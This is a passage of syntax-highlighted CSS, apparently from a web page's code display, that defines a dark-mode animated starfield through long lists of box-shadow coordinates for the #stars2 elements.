</span><span class="token comment" spellcheck="true">#fff, 793px 575px </span><span class="token comment" spellcheck="true">#fff, 542px 926px </span><span class="token comment" spellcheck="true">#fff, 1252px 25px </span><span class="token comment" spellcheck="true">#fff, 831px 332px </span><span class="token comment" spellcheck="true">#fff, 718px 283px </span><span class="token comment" spellcheck="true">#fff, 1327px 1952px </span><span class="token comment" spellcheck="true">#fff, 1019px 704px </span><span class="token comment" spellcheck="true">#fff, 888px 1117px </span><span class="token comment" spellcheck="true">#fff, 1107px 1378px </span><span class="token comment" spellcheck="true">#fff, 532px 505px </span><span class="token comment" spellcheck="true">#fff, 1070px 552px </span><span class="token comment" spellcheck="true">#fff, 346px 645px </span><span class="token comment" spellcheck="true">#fff, 63px 1783px </span><span class="token comment" spellcheck="true">#fff, 775px 879px </span><span class="token comment" spellcheck="true">#fff, 165px 160px </span><span class="token comment" spellcheck="true">#fff, 788px 1225px </span><span class="token comment" spellcheck="true">#fff, 1562px 1520px </span><span class="token comment" spellcheck="true">#fff, 56px 1522px </span><span class="token comment" spellcheck="true">#fff, 439px 498px </span><span class="token comment" spellcheck="true">#fff, 1988px 1521px </span><span class="token comment" spellcheck="true">#fff, 254px 1363px </span><span class="token comment" spellcheck="true">#fff, 1162px 816px </span><span class="token comment" spellcheck="true">#fff, 219px 386px </span><span class="token comment" spellcheck="true">#fff, 1789px 1315px </span><span class="token comment" spellcheck="true">#fff, 1090px 1415px </span><span class="token comment" spellcheck="true">#fff, 1361px 315px </span><span class="token comment" spellcheck="true">#fff, 825px 1306px </span><span class="token comment" spellcheck="true">#fff, 92px 548px </span><span class="token comment" spellcheck="true">#fff, 1501px 1946px </span><span class="token comment" spellcheck="true">#fff, 350px 1735px </span><span class="token comment" spellcheck="true">#fff, 459px 1533px </span><span class="token comment" spellcheck="true">#fff, 1417px 931px </span><span class="token comment" spellcheck="true">#fff, 1849px 174px </span><span class="token comment" spellcheck="true">#fff, 220px 1084px </span><span class="token comment" spellcheck="true">#fff, 1357px 209px </span><span class="token comment" spellcheck="true">#fff, 1974px 358px </span><span class="token comment" spellcheck="true">#fff, 90px 808px </span><span class="token comment" spellcheck="true">#fff, 1247px 765px </span><span class="token comment" spellcheck="true">#fff, 1878px 725px </span><span class="token comment" spellcheck="true">#fff, 1415px 87px </span><span class="token comment" spellcheck="true">#fff, 1253px 943px </span><span class="token comment" spellcheck="true">#fff, 1455px 1919px </span><span class="token comment" spellcheck="true">#fff, 1321px 337px </span><span class="token comment" spellcheck="true">#fff, 1210px 1600px </span><span class="token comment" spellcheck="true">#fff, 1855px 1575px </span><span class="token comment" spellcheck="true">#fff, 325px 936px </span><span class="token comment" spellcheck="true">#fff, 1118px 892px </span><span class="token comment" spellcheck="true">#fff, 703px 294px </span><span class="token comment" spellcheck="true">#fff, 89px 891px </span><span class="token comment" spellcheck="true">#fff, 239px 1548px </span><span class="token comment" spellcheck="true">#fff, 280px 262px </span><span class="token comment" spellcheck="true">#fff, 1401px 555px </span><span class="token comment" spellcheck="true">#fff, 1092px 1638px </span><span class="token comment" spellcheck="true">#fff, 673px 1207px </span><span class="token comment" spellcheck="true">#fff, 1469px 1358px </span><span class="token comment" spellcheck="true">#fff, 1253px 1986px </span><span class="token comment" spellcheck="true">#fff, 1249px 1040px </span><span class="token comment" spellcheck="true">#fff, 253px 484px </span><span class="token comment" spellcheck="true">#fff, 1163px 775px </span><span class="token comment" spellcheck="true">#fff, 426px 162px </span><span class="token comment" spellcheck="true">#fff, 721px 1761px </span><span class="token comment" spellcheck="true">#fff, 369px 510px </span><span class="token comment" spellcheck="true">#fff, 702px 1599px </span><span class="token comment" spellcheck="true">#fff, 1883px 483px </span><span class="token comment" spellcheck="true">#fff, 680px 1604px </span><span class="token comment" spellcheck="true">#fff, 870px 1599px </span><span class="token comment" spellcheck="true">#fff, 976px 1808px </span><span class="token comment" spellcheck="true">#fff, 916px 477px </span><span class="token comment" spellcheck="true">#fff, 1223px 1636px </span><span class="token comment" spellcheck="true">#fff, 506px 993px </span><span class="token comment" spellcheck="true">#fff, 898px 1284px </span><span class="token comment" spellcheck="true">#fff, 1013px 290px </span><span class="token comment" spellcheck="true">#fff, 1189px 78px </span><span class="token comment" spellcheck="true">#fff, 25px 588px </span><span class="token comment" spellcheck="true">#fff, 960px 861px </span><span class="token comment" spellcheck="true">#fff, 28px 526px </span><span class="token comment" spellcheck="true">#fff, 959px 681px </span><span class="token comment" spellcheck="true">#fff, 1426px 1329px </span><span class="token comment" spellcheck="true">#fff, 294px 557px </span><span class="token comment" spellcheck="true">#fff, 1907px 1320px </span><span class="token comment" spellcheck="true">#fff, 1289px 1627px </span><span class="token comment" spellcheck="true">#fff, 124px 451px </span><span class="token comment" spellcheck="true">#fff, 967px 653px </span><span class="token comment" spellcheck="true">#fff, 892px 1460px </span><span class="token comment" spellcheck="true">#fff, 537px 1385px </span><span class="token comment" spellcheck="true">#fff, 197px 1954px </span><span class="token comment" spellcheck="true">#fff, 1543px 302px </span><span class="token comment" spellcheck="true">#fff, 747px 1953px </span><span class="token comment" spellcheck="true">#fff, 995px 1630px </span><span class="token comment" spellcheck="true">#fff, 1423px 1221px </span><span class="token comment" spellcheck="true">#fff, 1075px 983px </span><span class="token comment" spellcheck="true">#fff, 1556px 1739px </span><span class="token comment" spellcheck="true">#fff, 1068px 1425px </span><span class="token comment" spellcheck="true">#fff, 81px 550px </span><span class="token comment" spellcheck="true">#fff, 1668px 523px </span><span class="token comment" spellcheck="true">#fff, 1158px 438px </span><span class="token comment" spellcheck="true">#fff, 401px 1795px </span><span class="token comment" spellcheck="true">#fff, 537px 1072px </span><span class="token comment" spellcheck="true">#fff, 1px 326px </span><span class="token comment" spellcheck="true">#fff, 249px 118px </span><span class="token comment" spellcheck="true">#fff, 832px 1544px </span><span class="token comment" spellcheck="true">#fff, 240px 153px </span><span class="token comment" spellcheck="true">#fff, 651px 1077px </span><span class="token comment" spellcheck="true">#fff, 1656px 542px </span><span class="token comment" spellcheck="true">#fff, 1102px 606px </span><span class="token comment" spellcheck="true">#fff, 1583px 788px </span><span class="token comment" spellcheck="true">#fff, 1205px 1842px </span><span class="token comment" spellcheck="true">#fff, 1657px 1793px </span><span class="token comment" spellcheck="true">#fff, 1848px 1464px </span><span class="token comment" spellcheck="true">#fff, 1285px 1395px </span><span class="token comment" spellcheck="true">#fff, 662px 1227px </span><span class="token comment" spellcheck="true">#fff, 1790px 134px </span><span class="token comment" spellcheck="true">#fff, 577px 263px </span><span class="token comment" spellcheck="true">#fff, 383px 702px </span><span class="token comment" spellcheck="true">#fff, 1728px 1953px </span><span class="token comment" spellcheck="true">#fff, 417px 57px </span><span class="token comment" spellcheck="true">#fff, 1390px 574px </span><span class="token comment" spellcheck="true">#fff, 1024px 287px </span><span class="token comment" spellcheck="true">#fff, 1969px 753px </span><span class="token comment" spellcheck="true">#fff, 1239px 1036px </span><span class="token comment" spellcheck="true">#fff, 1063px 1313px </span><span class="token comment" spellcheck="true">#fff, 1784px 1519px </span><span class="token comment" spellcheck="true">#fff, 1665px 682px </span><span class="token comment" spellcheck="true">#fff, 806px 1437px </span><span class="token comment" spellcheck="true">#fff, 394px 917px </span><span class="token comment" spellcheck="true">#fff, 904px 666px </span><span class="token comment" spellcheck="true">#fff, 801px 1280px </span><span class="token comment" spellcheck="true">#fff, 1392px 1930px </span><span class="token comment" spellcheck="true">#fff, 1611px 1386px </span><span class="token comment" spellcheck="true">#fff, 1809px 1507px </span><span class="token comment" spellcheck="true">#fff, 1720px 1300px </span><span class="token comment" spellcheck="true">#fff, 1721px 1287px </span><span class="token comment" spellcheck="true">#fff, 969px 240px </span><span class="token comment" spellcheck="true">#fff, 3px 1070px </span><span class="token comment" spellcheck="true">#fff, 1198px 538px </span><span class="token comment" spellcheck="true">#fff, 1416px 1001px </span><span class="token comment" spellcheck="true">#fff, 1665px 1265px </span><span class="token comment" spellcheck="true">#fff, 1010px 1275px </span><span class="token comment" spellcheck="true">#fff, 772px 978px </span><span class="token comment" spellcheck="true">#fff, 1980px 980px </span><span class="token comment" spellcheck="true">#fff, 1283px 1573px </span><span class="token comment" spellcheck="true">#fff, 444px 516px </span><span class="token comment" spellcheck="true">#fff, 875px 737px </span><span class="token comment" spellcheck="true">#fff, 258px 716px </span><span class="token comment" spellcheck="true">#fff, 1698px 758px </span><span class="token comment" spellcheck="true">#fff, 644px 238px </span><span class="token comment" spellcheck="true">#fff, 19px 876px </span><span class="token comment" spellcheck="true">#fff, 355px 1327px </span><span class="token comment" spellcheck="true">#fff, 1602px 1846px </span><span class="token comment" spellcheck="true">#fff, 548px 534px </span><span class="token comment" spellcheck="true">#fff, 1498px 1473px </span><span class="token comment" spellcheck="true">#fff, 1389px 1136px </span><span class="token comment" spellcheck="true">#fff, 174px 771px </span><span class="token comment" spellcheck="true">#fff, 955px 1931px </span><span class="token comment" spellcheck="true">#fff, 403px 371px </span><span class="token comment" spellcheck="true">#fff, 1502px 794px </span><span class="token comment" spellcheck="true">#fff, 117px 876px </span><span class="token comment" spellcheck="true">#fff, 536px 778px </span><span class="token comment" spellcheck="true">#fff, 67px 393px </span><span class="token comment" spellcheck="true">#fff, 119px 1918px </span><span class="token comment" spellcheck="true">#fff, 1912px 1663px </span><span class="token comment" spellcheck="true">#fff, 1141px 245px </span><span class="token comment" spellcheck="true">#fff, 1105px 130px </span><span class="token comment" spellcheck="true">#fff, 1218px 1608px </span><span class="token comment" spellcheck="true">#fff, 662px 1502px </span><span class="token comment" spellcheck="true">#fff, 1907px 927px </span><span class="token comment" spellcheck="true">#fff, 521px 109px </span><span class="token comment" spellcheck="true">#fff, 1885px 362px </span><span class="token comment" spellcheck="true">#fff, 1785px 1935px </span><span class="token comment" spellcheck="true">#fff, 781px 427px </span><span class="token comment" spellcheck="true">#fff, 1446px 1991px </span><span class="token comment" spellcheck="true">#fff, 164px 1539px </span><span class="token comment" spellcheck="true">#fff, 1807px 1795px </span><span class="token comment" spellcheck="true">#fff, 1922px 890px </span><span class="token comment" spellcheck="true">#fff, 1245px 933px </span><span class="token comment" spellcheck="true">#fff, 446px 450px </span><span class="token comment" spellcheck="true">#fff, 1743px 79px </span><span class="token comment" spellcheck="true">#fff, 1959px 310px </span><span class="token comment" spellcheck="true">#fff, 1348px 749px </span><span class="token comment" spellcheck="true">#fff, 1954px 128px </span><span class="token comment" spellcheck="true">#fff, 1980px 1030px </span><span class="token comment" spellcheck="true">#fff, 1850px 302px </span><span class="token comment" spellcheck="true">#fff, 1074px 922px </span><span class="token comment" spellcheck="true">#fff, 174px 403px </span><span class="token comment" spellcheck="true">#fff, 1579px 733px </span><span class="token comment" spellcheck="true">#fff, 653px 1958px </span><span class="token comment" spellcheck="true">#fff, 1511px 1943px </span><span class="token comment" spellcheck="true">#fff, 1037px 741px </span><span class="token comment" spellcheck="true">#fff, 602px 1384px </span><span class="token comment" spellcheck="true">#fff, 103px 402px </span><span class="token comment" spellcheck="true">#fff, 1722px 1417px </span><span class="token comment" spellcheck="true">#fff, 1732px 1916px </span><span class="token comment" spellcheck="true">#fff, 1743px 1803px </span><span class="token comment" spellcheck="true">#fff, 381px 721px </span><span class="token comment" spellcheck="true">#fff, 964px 1700px </span><span class="token comment" spellcheck="true">#fff, 1070px 341px </span><span class="token comment" spellcheck="true">#fff, 1376px 1258px </span><span class="token comment" spellcheck="true">#fff, 1884px 570px </span><span class="token comment" spellcheck="true">#fff, 940px 280px </span><span class="token comment" spellcheck="true">#fff, 1484px 1658px </span><span class="token comment" spellcheck="true">#fff, 1806px 1875px </span><span class="token comment" spellcheck="true">#fff, 1054px 917px </span><span class="token comment" spellcheck="true">#fff, 1672px 103px </span><span class="token comment" spellcheck="true">#fff, 783px 574px </span><span class="token comment" spellcheck="true">#fff, 98px 347px </span><span class="token comment" spellcheck="true">#fff, 555px 1136px </span><span class="token comment" spellcheck="true">#fff, 1403px 1237px </span><span class="token comment" spellcheck="true">#fff, 1203px 339px </span><span class="token comment" spellcheck="true">#fff, 572px 35px </span><span class="token comment" spellcheck="true">#fff, 932px 1783px </span><span class="token comment" spellcheck="true">#fff, 1527px 1850px </span><span class="token comment" spellcheck="true">#fff, 1959px 1109px </span><span class="token comment" spellcheck="true">#fff, 892px 623px </span><span class="token comment" spellcheck="true">#fff, 211px 1388px </span><span class="token comment" spellcheck="true">#fff, 1581px 1806px </span><span class="token comment" spellcheck="true">#fff, 868px 1053px </span><span class="token comment" spellcheck="true">#fff, 1243px 1997px </span><span class="token comment" spellcheck="true">#fff, 1004px 522px </span><span class="token comment" spellcheck="true">#fff, 1241px 1707px </span><span class="token comment" spellcheck="true">#fff, 376px 282px </span><span class="token comment" spellcheck="true">#fff, 537px 878px </span><span class="token comment" spellcheck="true">#fff, 1948px 979px </span><span class="token comment" spellcheck="true">#fff, 532px 688px </span><span class="token comment" spellcheck="true">#fff, 273px 958px </span><span class="token comment" spellcheck="true">#fff, 581px 927px </span><span class="token comment" spellcheck="true">#fff, 1060px 887px </span><span class="token comment" spellcheck="true">#fff, 486px 1467px </span><span class="token comment" spellcheck="true">#fff, 1122px 1834px </span><span class="token comment" spellcheck="true">#fff, 1650px 1763px </span><span class="token comment" spellcheck="true">#fff, 532px 302px </span><span class="token comment" spellcheck="true">#fff, 314px 1111px </span><span class="token comment" spellcheck="true">#fff, 1888px 683px </span><span class="token comment" spellcheck="true">#fff, 1856px 1040px </span><span class="token comment" spellcheck="true">#fff, 1780px 1338px </span><span class="token comment" spellcheck="true">#fff, 24px 1564px </span><span class="token comment" spellcheck="true">#fff, 1096px 1808px </span><span class="token comment" spellcheck="true">#fff, 1202px 1968px </span><span class="token comment" spellcheck="true">#fff, 214px 992px </span><span class="token comment" spellcheck="true">#fff, 728px 515px </span><span class="token comment" spellcheck="true">#fff, 247px 278px </span><span class="token comment" spellcheck="true">#fff, 1670px 45px </span><span class="token comment" spellcheck="true">#fff, 442px 1579px </span><span class="token comment" spellcheck="true">#fff, 1143px 30px </span><span class="token comment" spellcheck="true">#fff, 612px 72px </span><span class="token comment" spellcheck="true">#fff, 1177px 1303px </span><span class="token comment" spellcheck="true">#fff, 1898px 1255px </span><span class="token comment" spellcheck="true">#fff, 378px 1667px </span><span class="token comment" spellcheck="true">#fff, 326px 1929px </span><span class="token comment" spellcheck="true">#fff, 1257px 766px </span><span class="token comment" spellcheck="true">#fff, 1363px 1170px </span><span class="token comment" spellcheck="true">#fff, 1090px 1667px </span><span class="token comment" spellcheck="true">#fff, 711px 293px </span><span class="token comment" spellcheck="true">#fff, 249px 1406px </span><span class="token comment" spellcheck="true">#fff, 1589px 565px </span><span class="token comment" spellcheck="true">#fff, 1451px 29px </span><span class="token comment" spellcheck="true">#fff, 1171px 1459px </span><span class="token comment" spellcheck="true">#fff, 1294px 1214px </span><span class="token comment" spellcheck="true">#fff, 342px 942px </span><span class="token comment" spellcheck="true">#fff, 1945px 353px </span><span class="token comment" spellcheck="true">#fff, 741px 1185px </span><span class="token comment" spellcheck="true">#fff, 894px 1453px </span><span class="token comment" spellcheck="true">#fff, 593px 1584px </span><span class="token comment" spellcheck="true">#fff, 518px 630px </span><span class="token comment" spellcheck="true">#fff, 393px 756px </span><span class="token comment" spellcheck="true">#fff, 34px 608px </span><span class="token comment" spellcheck="true">#fff;</span><span class="token punctuation">}</span>body.DarkMode <span class="token comment" spellcheck="true">#stars2 {</span>    width: 2px<span class="token punctuation">;</span>    height: 2px<span class="token punctuation">;</span>    background: 0 0<span class="token punctuation">;</span>    box-shadow: 114px 658px <span class="token comment" spellcheck="true">#fff, 236px 768px </span><span class="token comment" spellcheck="true">#fff, 1130px 1503px </span><span class="token comment" spellcheck="true">#fff, 486px 592px </span><span class="token comment" spellcheck="true">#fff, 1353px 1407px </span><span class="token comment" spellcheck="true">#fff, 1583px 1741px </span><span class="token comment" spellcheck="true">#fff, 450px 1479px </span><span class="token comment" spellcheck="true">#fff, 1845px 327px </span><span class="token comment" spellcheck="true">#fff, 1520px 361px </span><span class="token comment" spellcheck="true">#fff, 580px 1699px </span><span class="token comment" spellcheck="true">#fff, 1277px 1233px </span><span class="token comment" spellcheck="true">#fff, 1697px 943px </span><span class="token comment" spellcheck="true">#fff, 568px 1135px </span><span class="token comment" spellcheck="true">#fff, 1273px 263px </span><span class="token comment" spellcheck="true">#fff, 788px 126px </span><span class="token comment" spellcheck="true">#fff, 1834px 1911px </span><span class="token comment" spellcheck="true">#fff, 1147px 1652px </span><span class="token comment" spellcheck="true">#fff, 651px 567px </span><span class="token comment" spellcheck="true">#fff, 79px 1897px </span><span class="token comment" spellcheck="true">#fff, 1590px 666px </span><span class="token comment" spellcheck="true">#fff, 1362px 566px </span><span class="token comment" spellcheck="true">#fff, 275px 367px </span><span class="token comment" spellcheck="true">#fff, 556px 479px </span><span class="token comment" spellcheck="true">#fff, 1063px 476px </span><span class="token comment" spellcheck="true">#fff, 1337px 1119px </span><span class="token comment" spellcheck="true">#fff, 1780px 1109px </span><span class="token comment" spellcheck="true">#fff, 1323px 1655px </span><span class="token comment" spellcheck="true">#fff, 1740px 1165px </span><span class="token comment" spellcheck="true">#fff, 525px 60px </span><span class="token comment" spellcheck="true">#fff, 1513px 1484px </span><span class="token comment" spellcheck="true">#fff, 708px 280px </span><span class="token comment" spellcheck="true">#fff, 429px 475px </span><span class="token comment" spellcheck="true">#fff, 563px 1360px </span><span class="token comment" spellcheck="true">#fff, 1580px 697px </span><span class="token comment" spellcheck="true">#fff, 1702px 1164px </span><span class="token comment" spellcheck="true">#fff, 1649px 1952px </span><span class="token comment" spellcheck="true">#fff, 1580px 1812px </span><span class="token comment" spellcheck="true">#fff, 70px 1190px </span><span class="token comment" spellcheck="true">#fff, 1100px 98px </span><span class="token comment" spellcheck="true">#fff, 1232px 1896px </span><span class="token comment" spellcheck="true">#fff, 851px 1047px </span><span class="token comment" spellcheck="true">#fff, 851px 30px </span><span class="token comment" spellcheck="true">#fff, 596px 1486px </span><span class="token comment" spellcheck="true">#fff, 666px 526px </span><span class="token comment" spellcheck="true">#fff, 1855px 1342px </span><span class="token comment" spellcheck="true">#fff, 80px 531px </span><span class="token comment" spellcheck="true">#fff, 248px 1804px </span><span class="token comment" spellcheck="true">#fff, 1990px 263px </span><span class="token comment" spellcheck="true">#fff, 1796px 1640px </span><span class="token comment" spellcheck="true">#fff, 1502px 862px </span><span class="token comment" spellcheck="true">#fff, 1780px 488px </span><span class="token comment" spellcheck="true">#fff, 1881px 1191px </span><span class="token comment" spellcheck="true">#fff, 1063px 876px </span><span class="token comment" spellcheck="true">#fff, 1614px 1073px </span><span class="token comment" spellcheck="true">#fff, 1414px 666px </span><span class="token comment" spellcheck="true">#fff, 1865px 289px </span><span class="token comment" spellcheck="true">#fff, 687px 352px </span><span class="token comment" spellcheck="true">#fff, 1329px 1312px </span><span class="token comment" spellcheck="true">#fff, 279px 136px </span><span class="token comment" spellcheck="true">#fff, 475px 756px </span><span class="token comment" spellcheck="true">#fff, 1177px 435px </span><span class="token comment" spellcheck="true">#fff, 1264px 921px </span><span class="token comment" spellcheck="true">#fff, 467px 1496px </span><span class="token comment" spellcheck="true">#fff, 391px 1359px </span><span class="token comment" spellcheck="true">#fff, 666px 1083px </span><span class="token comment" spellcheck="true">#fff, 1526px 1251px </span><span class="token comment" spellcheck="true">#fff, 594px 564px </span><span class="token comment" spellcheck="true">#fff, 991px 525px </span><span class="token comment" spellcheck="true">#fff, 1511px 875px </span><span class="token comment" spellcheck="true">#fff, 1935px 1049px </span><span class="token comment" spellcheck="true">#fff, 1471px 1430px </span><span class="token comment" spellcheck="true">#fff, 959px 604px </span><span class="token comment" spellcheck="true">#fff, 1685px 72px </span><span class="token comment" spellcheck="true">#fff, 1505px 1876px </span><span class="token comment" spellcheck="true">#fff, 509px 1627px </span><span class="token comment" spellcheck="true">#fff, 1065px 978px </span><span class="token comment" spellcheck="true">#fff, 1860px 884px </span><span class="token comment" spellcheck="true">#fff, 1038px 464px </span><span class="token comment" spellcheck="true">#fff, 1051px 106px </span><span class="token comment" spellcheck="true">#fff, 1056px 728px </span><span class="token comment" spellcheck="true">#fff, 1953px 45px </span><span class="token comment" spellcheck="true">#fff, 1483px 638px </span><span class="token comment" spellcheck="true">#fff, 559px 845px </span><span class="token comment" spellcheck="true">#fff, 1184px 922px </span><span class="token comment" spellcheck="true">#fff, 1320px 1117px </span><span class="token comment" spellcheck="true">#fff, 1572px 747px </span><span class="token comment" spellcheck="true">#fff, 1971px 43px </span><span class="token comment" spellcheck="true">#fff, 665px 13px </span><span class="token comment" spellcheck="true">#fff, 1457px 1153px </span><span class="token comment" spellcheck="true">#fff, 848px 154px </span><span class="token comment" spellcheck="true">#fff, 1039px 1837px </span><span class="token comment" spellcheck="true">#fff, 878px 795px </span><span class="token comment" spellcheck="true">#fff, 1286px 1705px </span><span class="token comment" spellcheck="true">#fff, 1946px 1143px </span><span class="token comment" spellcheck="true">#fff, 1114px 1166px </span><span class="token comment" spellcheck="true">#fff, 1747px 874px </span><span class="token comment" spellcheck="true">#fff, 1894px 636px </span><span class="token comment" spellcheck="true">#fff, 1316px 541px </span><span class="token comment" spellcheck="true">#fff, 1953px 1620px </span><span class="token comment" spellcheck="true">#fff, 1446px 1773px </span><span class="token comment" spellcheck="true">#fff, 974px 833px </span><span class="token comment" spellcheck="true">#fff, 1814px 1211px </span><span class="token comment" spellcheck="true">#fff, 102px 335px </span><span class="token comment" spellcheck="true">#fff, 327px 1868px </span><span class="token comment" spellcheck="true">#fff, 348px 548px </span><span class="token comment" spellcheck="true">#fff, 353px 1540px </span><span class="token comment" spellcheck="true">#fff, 1212px 1872px </span><span class="token comment" spellcheck="true">#fff, 1968px 129px </span><span class="token comment" spellcheck="true">#fff, 1531px 644px </span><span class="token comment" spellcheck="true">#fff, 1939px 559px </span><span class="token comment" spellcheck="true">#fff, 1397px 1876px </span><span class="token comment" spellcheck="true">#fff, 1446px 1446px </span><span class="token comment" spellcheck="true">#fff, 1721px 603px </span><span class="token comment" spellcheck="true">#fff, 924px 1171px </span><span class="token comment" spellcheck="true">#fff, 1086px 1954px </span><span class="token comment" spellcheck="true">#fff, 1798px 310px </span><span class="token comment" spellcheck="true">#fff, 21px 1595px </span><span class="token comment" spellcheck="true">#fff, 1462px 1948px </span><span class="token comment" spellcheck="true">#fff, 149px 1752px </span><span class="token comment" spellcheck="true">#fff, 804px 318px </span><span class="token comment" spellcheck="true">#fff, 1262px 636px </span><span class="token comment" spellcheck="true">#fff, 1051px 100px </span><span class="token comment" spellcheck="true">#fff, 392px 560px </span><span class="token comment" spellcheck="true">#fff, 654px 1236px </span><span class="token comment" spellcheck="true">#fff, 1889px 1159px </span><span class="token comment" spellcheck="true">#fff, 498px 394px </span><span class="token comment" spellcheck="true">#fff, 522px 1889px </span><span class="token comment" spellcheck="true">#fff, 1198px 579px </span><span class="token comment" spellcheck="true">#fff, 1437px 1866px </span><span class="token comment" spellcheck="true">#fff, 1049px 1064px </span><span class="token comment" spellcheck="true">#fff, 286px 921px </span><span class="token comment" spellcheck="true">#fff, 993px 1790px </span><span class="token comment" spellcheck="true">#fff, 1557px 1997px </span><span class="token comment" spellcheck="true">#fff, 1525px 532px </span><span class="token comment" spellcheck="true">#fff, 481px 1561px </span><span class="token comment" spellcheck="true">#fff, 790px 683px </span><span class="token comment" spellcheck="true">#fff, 141px 17px </span><span class="token comment" spellcheck="true">#fff, 1202px 28px </span><span class="token comment" spellcheck="true">#fff, 518px 1927px </span><span class="token comment" spellcheck="true">#fff, 90px 1677px </span><span class="token comment" spellcheck="true">#fff, 1258px 370px </span><span class="token comment" spellcheck="true">#fff, 1379px 1536px </span><span class="token comment" spellcheck="true">#fff, 607px 474px </span><span class="token comment" spellcheck="true">#fff, 163px 139px </span><span class="token comment" spellcheck="true">#fff, 1025px 1359px </span><span class="token comment" spellcheck="true">#fff, 815px 845px </span><span class="token comment" spellcheck="true">#fff, 231px 1212px </span><span class="token comment" spellcheck="true">#fff, 192px 806px </span><span class="token comment" spellcheck="true">#fff, 313px 1946px </span><span class="token comment" spellcheck="true">#fff, 1132px 1808px </span><span class="token comment" spellcheck="true">#fff, 624px 767px </span><span class="token comment" spellcheck="true">#fff, 379px 722px </span><span class="token comment" spellcheck="true">#fff, 733px 1847px </span><span class="token comment" spellcheck="true">#fff, 628px 1517px </span><span class="token comment" spellcheck="true">#fff, 1559px 929px </span><span class="token comment" spellcheck="true">#fff, 234px 397px </span><span class="token comment" spellcheck="true">#fff, 1230px 1231px </span><span class="token comment" spellcheck="true">#fff, 849px 726px </span><span class="token comment" spellcheck="true">#fff, 1148px 786px </span><span class="token comment" spellcheck="true">#fff, 546px 1533px </span><span class="token comment" spellcheck="true">#fff, 477px 822px </span><span class="token comment" spellcheck="true">#fff, 1325px 480px </span><span class="token comment" spellcheck="true">#fff, 972px 383px </span><span class="token comment" spellcheck="true">#fff, 334px 958px </span><span class="token comment" spellcheck="true">#fff, 1032px 664px </span><span class="token comment" spellcheck="true">#fff, 1781px 40px </span><span class="token comment" spellcheck="true">#fff, 38px 1335px </span><span class="token comment" spellcheck="true">#fff, 1634px 1691px </span><span class="token comment" spellcheck="true">#fff, 1061px 680px </span><span class="token comment" spellcheck="true">#fff, 1319px 304px </span><span class="token comment" spellcheck="true">#fff, 82px 1776px </span><span class="token comment" spellcheck="true">#fff, 1302px 509px </span><span class="token comment" spellcheck="true">#fff, 1231px 746px </span><span class="token comment" spellcheck="true">#fff, 1264px 1509px </span><span class="token comment" spellcheck="true">#fff, 980px 495px </span><span class="token comment" spellcheck="true">#fff, 1153px 1381px </span><span class="token comment" spellcheck="true">#fff, 1981px 1918px </span><span class="token comment" spellcheck="true">#fff, 70px 113px </span><span class="token comment" spellcheck="true">#fff, 390px 736px </span><span class="token comment" spellcheck="true">#fff, 1882px 1925px </span><span class="token comment" spellcheck="true">#fff, 1380px 1326px </span><span class="token comment" spellcheck="true">#fff, 257px 1681px </span><span class="token comment" spellcheck="true">#fff, 860px 998px </span><span class="token comment" spellcheck="true">#fff, 518px 1136px </span><span class="token comment" spellcheck="true">#fff, 168px 905px </span><span class="token comment" spellcheck="true">#fff, 500px 1882px </span><span class="token comment" spellcheck="true">#fff, 1012px 1572px </span><span class="token comment" spellcheck="true">#fff, 349px 1916px </span><span class="token comment" spellcheck="true">#fff, 905px 1339px </span><span class="token comment" spellcheck="true">#fff, 1940px 1803px </span><span class="token comment" spellcheck="true">#fff, 23px 1159px </span><span class="token comment" spellcheck="true">#fff, 9px 1559px </span><span class="token comment" spellcheck="true">#fff, 1658px 776px </span><span class="token comment" spellcheck="true">#fff, 820px 1361px </span><span class="token comment" spellcheck="true">#fff, 171px 983px </span><span class="token comment" spellcheck="true">#fff, 580px 1902px </span><span class="token comment" spellcheck="true">#fff, 1268px 263px </span><span class="token comment" spellcheck="true">#fff, 1734px 994px </span><span class="token comment" spellcheck="true">#fff, 1872px 29px </span><span class="token comment" spellcheck="true">#fff, 1475px 435px </span><span class="token comment" spellcheck="true">#fff;</span>    animation: animStar 100s linear infinite<span class="token punctuation">;</span><span class="token punctuation">}</span>body.DarkMode <span class="token comment" spellcheck="true">#stars2:after {</span>    content: <span class="token string">" "</span><span class="token punctuation">;</span>    position: absolute<span class="token punctuation">;</span>    top: 2000px<span class="token punctuation">;</span>    width: 2px<span class="token punctuation">;</span>    height: 2px<span class="token punctuation">;</span>    background: 0 0<span class="token punctuation">;</span>    box-shadow: 114px 658px <span class="token comment" spellcheck="true">#fff, 236px 768px </span><span class="token comment" spellcheck="true">#fff, 1130px 1503px </span><span class="token comment" spellcheck="true">#fff, 486px 592px </span><span class="token comment" spellcheck="true">#fff, 1353px 1407px </span><span class="token comment" spellcheck="true">#fff, 1583px 1741px </span><span class="token comment" spellcheck="true">#fff, 450px 1479px </span><span class="token comment" spellcheck="true">#fff, 1845px 327px </span><span class="token comment" spellcheck="true">#fff, 1520px 361px </span><span class="token comment" spellcheck="true">#fff, 580px 1699px </span><span class="token comment" spellcheck="true">#fff, 1277px 1233px </span><span class="token comment" spellcheck="true">#fff, 1697px 943px </span><span class="token comment" spellcheck="true">#fff, 568px 1135px </span><span class="token comment" spellcheck="true">#fff, 1273px 263px </span><span class="token comment" spellcheck="true">#fff, 788px 126px </span><span class="token comment" spellcheck="true">#fff, 1834px 1911px </span><span class="token comment" spellcheck="true">#fff, 1147px 1652px </span><span class="token comment" spellcheck="true">#fff, 651px 567px </span><span class="token comment" spellcheck="true">#fff, 79px 1897px </span><span class="token comment" spellcheck="true">#fff, 1590px 666px </span><span class="token comment" spellcheck="true">#fff, 1362px 566px </span><span class="token comment" spellcheck="true">#fff, 275px 367px </span><span class="token comment" spellcheck="true">#fff, 556px 479px </span><span class="token comment" spellcheck="true">#fff, 1063px 476px </span><span class="token comment" spellcheck="true">#fff, 1337px 1119px </span><span class="token comment" spellcheck="true">#fff, 1780px 1109px </span><span class="token comment" spellcheck="true">#fff, 1323px 1655px </span><span class="token comment" spellcheck="true">#fff, 1740px 1165px </span><span class="token comment" spellcheck="true">#fff, 525px 60px </span><span class="token comment" spellcheck="true">#fff, 1513px 1484px </span><span class="token comment" spellcheck="true">#fff, 708px 280px </span><span class="token comment" spellcheck="true">#fff, 429px 475px </span><span class="token comment" spellcheck="true">#fff, 563px 1360px </span><span class="token comment" spellcheck="true">#fff, 1580px 697px </span><span class="token comment" spellcheck="true">#fff, 1702px 1164px </span><span class="token comment" spellcheck="true">#fff, 1649px 1952px </span><span class="token comment" spellcheck="true">#fff, 1580px 1812px </span><span class="token comment" spellcheck="true">#fff, 70px 1190px </span><span class="token comment" spellcheck="true">#fff, 1100px 98px </span><span class="token comment" spellcheck="true">#fff, 1232px 1896px </span><span class="token comment" 